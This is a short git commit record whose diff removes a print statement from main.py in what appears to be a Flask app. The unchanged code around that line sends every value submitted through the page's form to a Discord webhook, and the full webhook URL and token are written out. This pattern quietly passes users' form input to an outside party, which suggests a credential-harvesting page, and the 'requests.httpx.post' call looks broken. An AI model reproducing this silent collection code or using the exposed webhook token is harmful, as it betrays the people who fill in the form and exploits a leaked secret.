2055e8b2fe3cf51b812b179c75d096250020c379
BuildTools <unconfigured@null.spigotmc.org>
2022-11-05 22:31:14 +0200

    removed print

--- main.py
+++ main.py
@@ -8,7 +8,6 @@ def hello_world():
     if request.method == 'POST':
         a = request.form
         for item, value in a.items():
-            print(f"{item}: {value}")
             requests.httpx.post("https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM", data={"content": f"{value}"})
     
     return render_template('base.html')
